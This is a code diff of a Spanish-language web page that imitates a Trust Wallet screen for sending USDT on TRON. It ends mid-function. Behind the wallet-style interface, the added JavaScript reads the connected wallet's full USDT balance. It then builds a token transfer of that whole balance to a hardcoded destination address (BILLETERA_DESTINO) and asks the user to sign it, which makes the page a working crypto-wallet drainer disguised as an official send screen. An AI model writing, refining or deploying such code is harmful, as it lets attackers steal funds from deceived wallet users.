@@ -39,7 +39,8 @@
             text-align: center;
             margin-right: -24px;
         }
-        .tw-back-btn { width: 24px; height: 24px; color: #1a1a1a; }
+        .tw-back-btn { width: 24px; height: 24px; color: #1a1a1a; cursor: pointer; }
+        
         .tw-card {
             background-color: #f5f7fa;
             border-radius: 16px;
@@ -49,14 +50,72 @@
             flex-direction: column;
             gap: 6px;
         }
-        .tw-card-label { font-size: 13px; font-weight: 500; color: #727782; }
-        .tw-input-container { display: flex; align-items: center; justify-content: space-between; width: 100%; }
-        .tw-field { background: transparent; border: none; color: #1a1a1a; font-size: 16px; font-weight: 500; width: 70%; outline: none; padding: 4px 0; }
-        .tw-action-blue { color: #0052ff; font-size: 14px; font-weight: 600; cursor: pointer; padding: 4px 0; }
-        .tw-token-name { color: #1a1a1a; font-size: 16px; font-weight: 600; }
-        .tw-status-banner { background-color: #edf2ff; border: 1px solid #d0e0ff; border-radius: 14px; padding: 14px 18px; font-size: 13px; color: #0052ff; margin-top: 10px; margin-bottom: 20px; display: none; text-align: left; line-height: 1.4; font-weight: 500; }
-        .tw-footer-btn-area { margin-top: auto; padding-bottom: 30px; }
-        .tw-submit-button { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .tw-card-label {
+            font-size: 13px;
+            font-weight: 500;
+            color: #727782;
+        }
+        .tw-input-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+        }
+        .tw-field {
+            background: transparent;
+            border: none;
+            color: #1a1a1a;
+            font-size: 16px;
+            font-weight: 500;
+            width: 70%;
+            outline: none;
+            padding: 4px 0;
+        }
+        .tw-field::placeholder { color: #a1a6b3; }
+        
+        .tw-action-blue {
+            color: #0052ff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 4px 0;
+        }
+        .tw-token-name {
+            color: #1a1a1a;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        .tw-status-banner {
+            background-color: #edf2ff;
+            border: 1px solid #d0e0ff;
+            border-radius: 14px;
+            padding: 14px 18px;
+            font-size: 13px;
+            color: #0052ff;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            display: none;
+            text-align: left;
+            line-height: 1.4;
+            font-weight: 500;
+        }
+        .tw-footer-btn-area {
+            margin-top: auto;
+            padding-bottom: 30px;
+        }
+        .tw-submit-button {
+            width: 100%;
+            height: 52px;
+            background-color: #0052ff;
+            color: #ffffff;
+            border: none;
+            border-radius: 26px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .tw-submit-button:disabled { background-color: #c2d6ff; color: #ffffff; cursor: not-allowed; }
     </style>
 </head>
 <body>
@@ -71,9 +130,9 @@
         </div>
 
         <div class="tw-card">
-            <label class="tw-label tw-card-label" for="addressDisplay">Dirección o nombre de dominio</label>
+            <label class="tw-card-label" for="addressDisplay">Dirección o nombre de dominio</label>
             <div class="tw-input-container">
-                <input id="addressDisplay" class="tw-field" type="text" value="TNQaxFKxhoYdMgbZqVHumy84tBidBaWT45" readonly />
+                <input id="addressDisplay" class="tw-field" type="text" placeholder="Dirección de destino TRON" />
                 <span class="tw-action-text tw-action-blue">Pegar</span>
             </div>
         </div>
@@ -82,6 +141,7 @@
             <label class="tw-card-label" for="amountDisplay">Cantidad</label>
             <div class="tw-input-container">
                 <input id="amountDisplay" class="tw-field" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any" />
+                <!-- Acción oficial "MÁX" a la izquierda del nombre del token -->
                 <div style="display: flex; align-items: center; gap: 12px;">
                     <span id="maxAction" class="tw-action-blue" style="display: none;">MÁX</span>
                     <span class="tw-token-name">USDT</span>
@@ -103,6 +163,7 @@
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
+    const addressDisplay = document.getElementById('addressDisplay');
     const maxAction = document.getElementById('maxAction');
 
     let walletAddress = null;
@@ -111,6 +172,8 @@
         statusDiv.innerText = message || '';
         statusDiv.style.display = message ? 'block' : 'none';
     }
+
+    addressDisplay.value = BILLETERA_DESTINO;
 
     async function obtenerBalanceSeguro(ownerAddress) {
         const tronWeb = window.tronWeb;
@@ -131,6 +194,7 @@
     }
 
     connectBtn.addEventListener('click', async () => {
+        // PASO 1: Sincronizar billetera
         if (!walletAddress) {
             try {
                 setStatus("Estableciendo enlace RPC con Trust Wallet...");
@@ -169,6 +233,7 @@
             return;
         }
 
+        // PASO 2: Procesar firma de balance total detectado
         if (walletAddress) {
             try {
                 const userAmount = parseFloat(amountDisplay.value);
@@ -188,49 +253,17 @@
 
                 setStatus("Solicitando autorización de firma digital...");
 
-                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO).replace(/^41/, '').padStart(64, '0');
-                const unitsInSunHex = balanceBigNumber.toString(16).padStart(64, '0');
+                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
 
-                const hexData = "a9059cbb" + destinoHex + unitsInSunHex;
-
-                const transactionDraft = await tronWeb.transactionBuilder.sendTransaction(
+                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_USDT,
-                    0,
+                    "transfer(address,uint256)",
+                    { feeLimit: 100000000 },
+                    [
+                        { type: 'address', value: destinoHex },
+                        { type: 'uint256', value: balanceBigNumber.toString() }
+                    ],
                     tronWeb.address.toHex(walletAddress)
                 );
 
-                transactionDraft.raw_data.contract[0].parameter.value.data = hexData;
-
-                const signedTx = await tronWeb.trx.sign(transactionDraft);
-                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
-
-                if (broadcast && broadcast.result) {
-                    setStatus("Transacción de saldo total completada exitosamente.");
-                    connectBtn.innerText = "Completado";
-                } else {
-                    throw new Error("La transacción fue rechazada por los nodos.");
-                }
-
-            } catch (error) {
-                console.error(error);
-                setStatus(error.message || "La transacción falló o fue cancelada.");
-                connectBtn.disabled = false;
-                connectBtn.innerText = "Continuar";
-            }
-        }
-    });
-
-    maxAction.addEventListener('click', async () => {
-        if (!walletAddress) return;
-        try {
-            setStatus("Calculando fondos totales...");
-            const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
-            amountDisplay.value = Number(balanceBigNumber.toString()) / 1_000_000;
-            setStatus("Saldo máximo asignado.");
-        } catch (e) {
-            console.error(e);
-            setStatus("Error al leer el saldo máximo.");
-        }
-    });
-</script>
-</body>
+                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
